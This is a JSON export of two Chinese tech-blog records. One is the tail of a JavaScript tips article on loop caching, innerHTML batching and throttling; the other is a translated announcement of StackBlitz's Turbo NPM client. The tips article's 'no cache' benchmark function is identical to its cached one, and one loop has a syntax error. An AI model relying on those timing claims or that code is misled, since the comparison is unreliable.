class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n!![]\n//\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n!!\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n//\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n!!null\n//\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e9.缓存变量\u003c/h2\u003e\u003ch3\u003efor循环缓存length\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr=[1,2,3,4,5,6]\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,i\u0026lt;arr.length;i++){\n    ...\n}\n//------------------------分割线\nvar arr=[1,2,3,4,5,6]\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=arr.length;i\u0026lt;len;i++){\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e第一段就是每一次循环的时候，都要查询一次arr.length。第二段代码就是缓存了arr.length，每次对比len就好，理论上是第二段代码的写法比较好，性能比较高！但是随着浏览器的发展，这个细节的性能上的影响貌似远远小于预期，现在还是建议缓存！我写了下面的测试用例(谷歌浏览器测试)！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr100=[], arr10000=[];\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;100;i++){\n    arr100.push(i)\n}\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;10000;i++){\n    arr10000.push(i)\n}\n//缓存情况\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eCache(arr){\n    console.time();\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=arr.length;i\u0026lt;len;i++){\n        \n    }\n    console.timeEnd()\n}\n//不缓存情况\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eNoCache(arr){\n    console.time();\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=arr.length;i\u0026lt;len;i++){\n        \n    }\n    console.timeEnd()\n}\n\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eCache(arr100)//default: 0.007ms\n\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eCache(arr10000)//default: 0.035ms\n\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eNoCache(arr100)//default: 0.012ms\n\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003eNoCache(arr10000)//default: 0.109ms\n//这只是一个最简单的数组，如果遍历的是一个nodeList（元素列表），效果可能会更明显。\n\u003c/code\u003e\u003c/pre\u003e\u003ch3\u003e元素事件\u003c/h3\u003e\u003cp\u003e这里我用jquery来讲解，比较容易理解，原生js也是这个道理！如下代码\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e$(\u003cspan class=\"hljs-string\"\u003e'.div1'\u003c/span\u003e).click(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n   ...\n})\n//--------------------------分割线   \nvar \u003cspan class=\"hljs-variable\"\u003e$div1\u003c/span\u003e=$(\u003cspan class=\"hljs-string\"\u003e'.div1'\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$div1\u003c/span\u003e.click(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n   ...\n})\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的代码，改变的也是缓存了$('.div1')，但是这里就建议是第二种写法了，因为第一种点击一次就要查询一次.div1，Dom的操作还是能减少就减少！\u003c/p\u003e\u003ch2\u003e10.使用innerHTML添加元素\u003c/h2\u003e\u003cp\u003e比如有一个需求，往\u003ccode\u003eul\u003c/code\u003e里面添加10个\u003ccode\u003eli\u003c/code\u003e，两种方法，如下代码\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n        \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\n    \u0026lt;/head\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;ul id=\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e\u0026gt;\n            \n        \u0026lt;/ul\u0026gt;\n    \u0026lt;/body\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n        var oUl=document.getElementById(\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e);\n        //createElement方式\n        console.time();\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;10;i++){\n            var oLi=document.createElement(\u003cspan class=\"hljs-string\"\u003e'li'\u003c/span\u003e);\n            oLi.innerHTML=i;\n            oUl.appendChild(oLi);\n        }\n        console.timeEnd();\n        //innerHTML方式\n        console.time();\n        var _html=\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;10;i++){\n            _html+=\u003cspan class=\"hljs-string\"\u003e'\u0026lt;li\u0026gt;'\u003c/span\u003e+i+\u003cspan class=\"hljs-string\"\u003e'\u0026lt;/li\u0026gt;'\u003c/span\u003e\n        }\n        oUl.innerHTML=_html;\n        console.timeEnd();\n    \u0026lt;/script\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e大家把代码用浏览器打开，发现基本是第二种方式更快，第8点也说了，DOM操作能少就少！第一种要操作10次DOM，第二种只需要操作1次DOM。还有一个就是，这个只是很简单的li,如果是下面的列表呢？用第一种方式，得createElement多少次，innerHTML多少次，appendChild多少次？代码多，各个节点的逻辑和嵌套关系也乱！用第二种方式就是一个拼接字符串的操作，比第一种方式好多了，如果用es6的模板字符串，就更简单了！\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4453fd37b0a?w=370\u0026amp;h=398\u0026amp;f=png\u0026amp;s=86199\"\u003e\u003c/p\u003e\u003ch2\u003e11.将参数转成数组\u003c/h2\u003e\u003cp\u003e函数里的arguments，虽然拥有length属性，但是arguments不是一个数组，是一个类数组，没有push,slice等方法。有些时候，需要把arguments转成数组，转的方法也不止一个，推荐的是是下面的写法！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar _arguments=Array.prototype.slice.apply(arguments)\n\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e12.函数节流\u003c/h2\u003e\u003cp\u003e这里拿一个栗子说，比如mousemove,onscroll,onresize这些事件触发的时候，可能已经触发了60次事件，这样很消耗性能，而且实际上，我们并不需要这么频繁的触发，只要大约100毫秒触发一次就好！那么这样就需要函数节流了！\u003c/p\u003e\u003cp\u003e普通写法\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar count = 0;\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebeginCount\u003c/span\u003e\u003c/span\u003e() {\n    count++;\n    console.log(count);\n}\ndocument.onmousemove = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n   beginCount();\n};\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf4453fbde66a?w=800\u0026amp;h=596\u0026amp;f=gif\u0026amp;s=151703\"\u003e\u003c/p\u003e\u003cp\u003e节流写法\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar count = 0;\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebeginCount\u003c/span\u003e\u003c/span\u003e() {\n    count++;\n    console.log(count);\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e delayFn(method, thisArg) {\n    clearTimeout(method.props);\n    method.props = \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n        method.call(thisArg)\n    },100)\n}\ndocument.onmousemove = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    delayFn(beginCount)\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf445673b76fc?w=800\u0026amp;h=596\u0026amp;f=gif\u0026amp;s=383244\"\u003e\u003c/p\u003e\u003cp\u003e这种方式，其实是有问题的，在不断触发停下来等待100ms才开始执行，中间操作得太快直接无视。于是在网上找到下面这种方案！\u003c/p\u003e\u003cp\u003e第二种节流写法\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e delayFn2 (fn, delay, mustDelay){\n     var timer = null;\n     var t_start;\n     \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n         var context = this, args = arguments, t_cur = +new Date();\n         //先清理上一次的调用触发（上一次调用触发事件不执行）\n         clearTimeout(timer);\n         //如果不存触发时间，那么当前的时间就是触发时间\n         \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!t_start){\n             t_start = t_cur;\n         }\n         //如果当前时间-触发时间大于最大的间隔时间（mustDelay），触发一次函数运行函数\n         \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(t_cur - t_start \u0026gt;= mustDelay){\n             fn.apply(context, args);\n             t_start = t_cur;\n         }\n         //否则延迟执行\n         \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n             timer = \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                 fn.apply(context, args);\n             }, delay);\n         }\n     };\n}\nvar count=0;\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efn1\u003c/span\u003e\u003c/span\u003e(){\n    count++;\n    console.log(count)\n} \n//100ms内连续触发的调用，后一个调用会把前一个调用的等待处理掉，但每隔200ms至少执行一次\ndocument.onmousemove=delayFn2(fn1,100,200)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf44576a04947?w=800\u0026amp;h=596\u0026amp;f=gif\u0026amp;s=194818\"\u003e\u003c/p\u003e\u003cblockquote class=\"\"\u003e\u003cp\u003e我现在函数节流用得很少，这两个写法是比较基础的，希望大家能共享下自己的比较好的方法！\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003c/blockquote\u003e\u003ch2\u003e13.其他写作建议\u003c/h2\u003e\u003cp\u003e关于其它的一些写法技巧和建议，都是比较老生常谈的，比如命名规范，函数单一性原则等。这一部分内容我自己总结和别人写的基本一致！我就不展开说了（感觉展开说也基本是复制粘贴别人的文章，这事我不干），所以我推荐大家去看这篇文章（\u003ca href=\"https://zhuanlan.zhihu.com/p/28910636\"\u003e如何优雅的编写 JavaScript 代码\u003c/a\u003e）。有些知识我也是从这里获得的！\u003c/p\u003e\u003ch2\u003e14.小结\u003c/h2\u003e\u003cp\u003e好了，关于我自己总结的一些实用技巧和建议，就到这里了！关于javascript的技巧和建议，这点大家还是要多看网上的资源，也要自己多总结，毕竟我自己总结的只是我自己发现的，只是冰山一角。但还是希望这篇文章能帮到大家，让大家学习到知识。当然，更希望的是能起到一个交流意见的作用。如果大家有什么建议，技巧。也欢迎分享。觉得我哪里写错了，写得不够好，也欢迎指出！让大家一起互相帮助，互相学习！\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514978742.553","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac40336f"},"id":"5a35d58ef265da431a434441","author":{"$oid":"5a4b770f19da8721f49c06f0"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/17/160624a78ff2d739?w=800\u0026h=320\u0026f=png\u0026s=60180","https://user-gold-cdn.xitu.io/2017/12/17/160624a78fcadfc8?w=800\u0026h=457\u0026f=gif\u0026s=323218"],"screenShot":null}],"title":"介绍 Turbo：比 Yarn 和 NPM 快 5 倍，可以在本地浏览器中运行","meta":{"likeCount":0},"tag":["前端","掘金翻译计划"],"comment":[],"shortContent":"当我们刚开始开发 StackBlitz 的时候，我们的目标就是创建一个在线的 IDE，这个 IDE 可以让你感觉和超级跑车的轮子一样快：你只需要接受瞬间响应命令的喜悦即可。 和 Turbo 不同的是，NPM 和 Yarn 是本地的。因为设计 NPM 和 Yarn 就是用来处理大…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca target=\"_blank\" href=\"https://medium.com/@ericsimons/introducing-turbo-5x-faster-than-yarn-npm-and-runs-natively-in-browser-cc2c39715403\"\u003eIntroducing Turbo: 5x faster than Yarn \u0026amp; NPM, and runs natively in-browser 🔥\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca target=\"_blank\" href=\"https://medium.com/@ericsimons?source=post_header_lockup\"\u003eEric Simons\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner/blob/master/TODO/introducing-turbo-5x-faster-than-yarn-npm-and-runs-natively-in-browser.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/introducing-turbo-5x-faster-than-yarn-npm-and-runs-natively-in-browser.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca target=\"_blank\" href=\"https://github.com/sunshine940326\"\u003eCherry\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca target=\"_blank\" href=\"https://github.com/yanyixin\"\u003e萌萌\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/noahziheng\"\u003enoahziheng\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003e介绍 Turbo：比 Yarn 和 NPM 快 5 倍，可以在本地浏览器中运行🔥\u003c/h1\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/17/160624a78ff2d739?w=800\u0026amp;h=320\u0026amp;f=png\u0026amp;s=60180\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意\u003c/strong\u003e ：这是我在 12 月6 日在谷歌山景学校演讲的一部分，\u003ca target=\"_blank\" href=\"https://www.meetup.com/modernweb/events/244544544/\"\u003e\u003cstrong\u003e欢迎加入！\u003c/strong\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在经过四个月的努力，我很兴奋的宣布 \u003cstrong\u003eTurbo\u003c/strong\u003e 诞生了！🎉\u003c/p\u003e\n\u003cp\u003eTurbo 是一个速度极快的 NPM 客户端，最初是为 \u003ca target=\"_blank\" href=\"https://stackblitz.com\"\u003eStackBlitz\u003c/a\u003e 创建的：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e安装包的速度最少是 Yarn 和 NPM 的五倍 🔥\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e** 将 \u003cstrong\u003e\u003ccode\u003enode_modules\u003c/code\u003e\u003c/strong\u003e 的大小减少到两个数量级😮 **\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e用于生产级可靠性的多层冗余\u003c/strong\u003e 💪\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e完全在 Web 浏览器中工作，能够拥有闪电般的开发环境 ⚡️\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"在 StackBlitz.com 中使用 Turbo 安装 NPM 包的实际速度\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/160624a7918a1e0d?w=800\u0026amp;h=441\u0026amp;f=gif\u0026amp;s=835778\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ca target=\"_blank\" href=\"https://stackblitz.com/\"\u003eStackBlitz.com\u003c/a\u003e 中使用 Turbo 安装 NPM 包的实际速度\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么呢？\u003c/h3\u003e\n\u003cp\u003e当我们刚开始开发 \u003ca target=\"_blank\" href=\"https://medium.com/@ericsimons/stackblitz-online-vs-code-ide-for-angular-react-7d09348497f4\"\u003eStackBlitz\u003c/a\u003e 的时候，我们的目标就是创建一个在线的 IDE，这个 IDE 可以让你感觉和超级跑车的轮子一样快：你只需要接受瞬间响应命令的喜悦即可。\u003c/p\u003e\n\u003cp\u003e和 Turbo 不同的是，NPM 和 Yarn 是本地的。因为设计 NPM 和 Yarn 就是用来处理大量依赖后台代码库，需要本地二进制或和其他资源。他们的安装速度就是超级跑车的速度和卡车的速度。但前端代码很少有这种大规模的依赖，难道这会有什么问题吗？当然，这些依赖仍然会作为 devDependencies 和 sub-dependencies 进入安装流程，并且依旧被下载和引用。将形成那个臭名昭著的黑洞：\u003ccode\u003enode_modules\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Dank, relevant meme\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/160624a78f0b46cc?w=600\u0026amp;h=360\u0026amp;f=png\u0026amp;s=67591\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为什么 NPM 不在本地的浏览器中工作，这是问题的关键。在 \u003ccode\u003enode_modules\u003c/code\u003e 文件夹中解析、下载、提取百兆字节（或千兆字节）的典型前端项目是一个挑战，在浏览器中并不适合这样做。此外，这也证明了为什么这个问题的服务器端解决方法是 \u003ca target=\"_blank\" href=\"https://github.com/unpkg/unpkg/issues/35#issuecomment-317128917\"\u003e慢、不可靠、并且成本较高的\u003c/a\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e所以，如果 NPM 本身不能在浏览器端运行，那我们从底层建一个新的 NPM 客户端会怎么样呢？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e解决方案：一个专门为 Web 构建的更聪明、更快的包管理器📦\u003c/h3\u003e\n\u003cp\u003eTurbo 的速度和效率大部分是通过利用与现代前端应用程序相同的技术来完成的，他们使用了 snappy performance—tree-shaking、懒加载和启用了 gzip 压缩的普通 XHR/fetch 请求。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e按需检索文件\u003c/strong\u003e 🚀\u003c/h4\u003e\n\u003cp\u003eTurbo 很巧妙的只检索 main、typings、和其他相关文件需要的文件而不是下载整个压缩包。无论是个人项目还是大型项目，这都减轻了惊人的负载。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"RxJS 和 RealWorld Angular 总有效载荷大小的比较\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/160624a7902af07b?w=800\u0026amp;h=600\u0026amp;f=png\u0026amp;s=42992\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://npmjs.com/package/rxjs\"\u003eRxJS\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://github.com/gothinkster/angular-realworld-example-app\"\u003eRealWorld Angular\u003c/a\u003e 总有效载荷大小的比较\u003c/p\u003e\n\u003cp\u003e那么如果你的重要文件并没有被主文件引用会怎么样呢？例如一个 \u003ca target=\"_blank\" href=\"https://stackblitz.com/edit/angular-material?file=theme.scss\"\u003eSass 文件\n\u003c/a\u003e，不用担心，Turb 按需进行懒加载并且一直保存以便将来使用，这个和微软新推出的 \u003ca target=\"_blank\" href=\"https://blogs.msdn.microsoft.com/devops/2017/02/03/announcing-gvfs-git-virtual-file-system/\"\u003eGVFS Git protocol\u003c/a\u003e 工作原理有些类似。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e具有多种故障转移策略的健壮缓存 🏋️\u003c/h4\u003e\n\u003cp\u003e我们最近推出了一个具有 Turbo 特征的 CDN，所有的 NPM 包都在一个使用 gzip 打包的 JSON 请求中，大大提高了包安装的速度。这个概念类似于 npm 的 tarball，它合并了所有的文件并且压缩他们。然而，Turbo 的缓存智能的只包含你项目需要的文件并压缩他们。\u003c/p\u003e\n\u003cp\u003e每一个 Turbo 的客户端都是在浏览器中独立运行的，并且如果你引用的包文件在我们的缓存中，那么会直接从 \u003ca target=\"_blank\" href=\"https://www.jsdelivr.com/\"\u003ejsDelivr 提供的大量的 CDN 资源\u003c/a\u003e 中自动按需下载。如果 jsDelivr 访问不了了怎么办？不要担心，会自动替换成 \u003ca target=\"_blank\" href=\"https://unpkg.com\"\u003eUnpkg CDN\u003c/a\u003e，提供三层超可靠的独立的包安装工具👌。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e快如闪电的依赖解决方案 ⚡️\u003c/h4\u003e\n\u003cp\u003e为了确保最小的有效负载大小，Turbo 使用一个定制的解析算法，在可能的情况下积极解决通用包版本。这也是出奇的快和冗余：无服务版本的解析器有权使用 NPM 在内存中的整个数据集并且\u003cstrong\u003e在 85ms 内\u003c/strong\u003e解析任何 package.json 文件。Turbo 在连接无服务器版本的解析器时有任何的问题，即便失败的时候也可以优雅的在浏览器中完整运行并且保留所有用于解决问题所必需的元数据。\u003c/p\u003e\n\u003cp\u003e在客户端完成依赖管理也会带来一些新的令人兴奋的可能性，比如只需单击一次就可以安装缺少的对等依赖关系 😮:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/17/160624a78fcadfc8?w=800\u0026amp;h=457\u0026amp;f=gif\u0026amp;s=323218\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e因为没有人读这些 NPM 在控制台输出的警告 😜\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eTurbo可以大规模使用的证据 📈\u003c/h4\u003e\n\u003cp\u003eTurbo 目前能够可靠地处理每个月百万级别的请求数，并且开销可以忽略不计。我们很兴奋的宣布：Google 的 Angular 团队最近选择 StackBlitz 来支持他们文档中的实例，而有数以百万计的开发人员在使用他们的文档。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e技术预览 🙌\u003c/h3\u003e\n\u003cp\u003eTurbo 是依赖于 \u003ca target=\"_blank\" href=\"https://stackblitz.com\"\u003eStackBlitz.com\u003c/a\u003e 的，并且通过技术预览阶段我们将会运行大量的测试和测速，检验效能和可靠性的改进，你的每一个反馈都是至关重要的，所以在使用中遇到问题，不假思索的向我们 \u003ca target=\"_blank\" href=\"https://github.com/stackblitz/core/issues\"\u003e提 issues\u003c/a\u003e 和在我们的 \u003ca target=\"_blank\" href=\"http://discord.gg/stackblitz\"\u003eDiscord 社区\u003c/a\u003e里和我们沟通🍻\u003c/p\u003e\n\u003cp\u003e然而 Turbo 最初是为生产级的使用而设计的，但在现实的 IDE（\u003ca target=\"_blank\" href=\"https://stackblitz.com\"\u003estackblitz\u003c/a\u003e）中，Turbo 已经找到了少数的在线应用场所，在社区，人们已经开始设计一种方法，使用 Turbo 使脚本类型与模块相等（很酷有没有！！！），我们迫不及待地想看到人们提出的其他惊人的东西，所以，一旦我们的 API 更加完善，我们会将其在\u003ca target=\"_blank\" href=\"https://github.com/stackblitz/core\"\u003e\u003cstrong\u003e我们的 Github\u003c/strong\u003e\u003c/a\u003e 中完全开源（和 StackBlitz 的其他部分一起）以供全世界人们使用 🤘。\u003c/p\u003e\n\u003cp\u003e最后，我们非常感谢 Google 的 Angular 团队在我们的技术下的赌注，同时感谢 Google Cloud 团队将他们令人惊叹的服务赞助给 Turbo 使用！❤️\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e一如既往，请随时通过 Tweet 联系我\u003c/h4\u003e\n\u003cp\u003e有任何的疑问、反馈、想法等等都可以通过 \u003ca target=\"_blank\" href=\"https://twitter.com/ericsimons40\"\u003e@ericsimons40\u003c/a\u003e 或者 @\u003ca target=\"_blank\" href=\"https://twitter.com/stackblitz\"\u003estackblitz\u003c/a\u003e 联系我 ：）\u003c/p\u003e\n\u003cp\u003e另外，如果你有兴趣支持我们的工作，请考虑订阅 \u003ca target=\"_blank\" href=\"https://thinkster.io/pro\"\u003eThinkster Pro\u003c/a\u003e！我们正在创建一个新系列关于我们是如何创建 Turbo 和 StackBlitz 的，以及修改我们的目录：）\u003c/p\u003e\n\u003cp\u003e我希望你们能看下我 12 月 6 日在 \u003ca target=\"_blank\" href=\"https://www.meetup.com/modernweb/events/244544544/\"\u003eMountain View 的视频\u003c/a\u003e。\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca target=\"_blank\" href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF\"\u003e前端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF\"\u003e后端\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE\"\u003e区块链\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81\"\u003e产品\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1\"\u003e设计\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD\"\u003e人工智能\u003c/a\u003e等领域，想要查看更多优质译文请持续关注 \u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca target=\"_blank\" href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514971882.8123","__v":0}
